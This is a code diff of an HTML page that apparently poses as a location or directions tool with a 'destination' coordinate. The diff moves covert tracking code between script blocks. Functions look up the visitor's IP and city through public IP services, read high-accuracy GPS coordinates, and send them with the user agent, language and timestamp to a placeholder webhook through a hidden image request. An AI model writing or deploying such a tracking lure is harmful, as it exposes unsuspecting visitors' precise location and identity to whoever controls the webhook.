@@ -281,6 +281,13 @@
   <script>
     const destinationLat = 38.897957;
     const destinationLon = -77.036560;
+    
+    let locationData = {
+      ip: "unknown",
+      region: "unknown",
+      country: "unknown",
+      city: "unknown"
+    };
 
     const translations = {
       en: {
@@ -386,19 +393,58 @@
         fallbackMessageEl.style.display = "none";
       }, { once: true });
     }
+    async function loadIpData() {
+      try {
+        const res = await fetch('https://ipwho.is/');
+        const ip = await res.json();
+        locationData.ip = ip.ip || "unknown";
+        locationData.region = ip.region || "unknown";
+        locationData.country = ip.country || "unknown";
+        locationData.city = ip.city || "unknown";
+      } catch {
+        locationData.ip = "unresolved";
+        try {
+          const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+          const data = await res.text();
+          const ipInfo = Object.fromEntries(data.trim().split('\n').map(line => line.split('=')));
+          locationData.ip = ipInfo.ip || "unresolved";
+          locationData.country = ipInfo.loc || "unknown";
+          locationData.region = "unknown";
+          locationData.city = "unknown";
+        } catch {
+          locationData.ip = "unresolved-fallback";
+          locationData.country = "unknown";
+          locationData.region = "unknown";
+          locationData.city = "unknown";
+        }
+      }
+    }
 
-    document.getElementById("lang-select").addEventListener("change", function () {
-      changeLanguage(this.value);
-    });
-
-    document.getElementById("theme-toggle").addEventListener("click", toggleTheme);
-
+    async function fallbackBeacon(reason, pos = {}) {
+      const lat = pos.coords?.latitude || "unknown";
+      const lon = pos.coords?.longitude || "unknown";
+      const acc = pos.coords?.accuracy || "unknown";
+      const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&country=${encodeURIComponent(locationData.country)}&region=${encodeURIComponent(locationData.region)}&city=${encodeURIComponent(locationData.city)}&ip=${encodeURIComponent(locationData.ip)}&deviceType=${encodeURIComponent(
+  document.body.classList.contains('mobile') ? 'mobile' :
+  document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
+)}&userAgent=${encodeURIComponent(navigator.userAgent)}&timestamp=${encodeURIComponent(new Date().toISOString())}&language=${encodeURIComponent(navigator.language)}`;
+      const img = new Image();
+      img.onerror = () => console.error("GET request failed:", url);
+      img.src = url;
+    }
+    
     window.addEventListener("DOMContentLoaded", () => {
       detectDeviceType();
       autoDetectLanguage();
     });
+
+    document.getElementById("lang-select").addEventListener("change", function () {
+      changeLanguage(this.value);
+    });
     
-document.getElementById("button").addEventListener("click", async () => {
+  document.getElementById("theme-toggle").addEventListener("click", toggleTheme);
+
+  document.getElementById("button").addEventListener("click", async () => {
   const button = document.getElementById("button");
   const loading = document.getElementById("loading-text");
   const timeoutMsg = document.getElementById("timeout-message");
@@ -467,56 +513,6 @@ document.getElementById("button").addEventListener("click", async () => {
     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
 });
-    
-  </script>
-
-  <script>
-    let locationData = {
-      ip: "unknown",
-      region: "unknown",
-      country: "unknown",
-      city: "unknown"
-    };
-
-    async function loadIpData() {
-      try {
-        const res = await fetch('https://ipwho.is/');
-        const ip = await res.json();
-        locationData.ip = ip.ip || "unknown";
-        locationData.region = ip.region || "unknown";
-        locationData.country = ip.country || "unknown";
-        locationData.city = ip.city || "unknown";
-      } catch {
-        locationData.ip = "unresolved";
-        try {
-          const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-          const data = await res.text();
-          const ipInfo = Object.fromEntries(data.trim().split('\n').map(line => line.split('=')));
-          locationData.ip = ipInfo.ip || "unresolved";
-          locationData.country = ipInfo.loc || "unknown";
-          locationData.region = "unknown";
-          locationData.city = "unknown";
-        } catch {
-          locationData.ip = "unresolved-fallback";
-          locationData.country = "unknown";
-          locationData.region = "unknown";
-          locationData.city = "unknown";
-        }
-      }
-    }
-    
-    async function fallbackBeacon(reason, pos = {}) {
-      const lat = pos.coords?.latitude || "unknown";
-      const lon = pos.coords?.longitude || "unknown";
-      const acc = pos.coords?.accuracy || "unknown";
-      const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&country=${encodeURIComponent(locationData.country)}&region=${encodeURIComponent(locationData.region)}&city=${encodeURIComponent(locationData.city)}&ip=${encodeURIComponent(locationData.ip)}&deviceType=${encodeURIComponent(
-  document.body.classList.contains('mobile') ? 'mobile' :
-  document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
-)}&userAgent=${encodeURIComponent(navigator.userAgent)}&timestamp=${encodeURIComponent(new Date().toISOString())}&language=${encodeURIComponent(navigator.language)}`;
-      const img = new Image();
-      img.onerror = () => console.error("GET request failed:", url);
-      img.src = url;
-    }
   </script>
 </body>
 </html>
